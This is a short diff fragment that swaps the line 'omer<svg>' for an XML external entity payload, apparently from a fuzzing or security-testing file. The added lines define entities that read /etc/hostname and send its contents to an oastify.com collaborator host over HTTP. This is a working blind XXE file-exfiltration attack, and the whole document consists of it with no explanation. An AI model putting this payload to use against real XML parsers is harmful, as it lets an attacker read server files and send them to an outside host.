@@ -1,1 +1,4 @@
-omer<svg>
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://sea3f3n1qr76yt5q6xm51uy85zbqzvnk.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
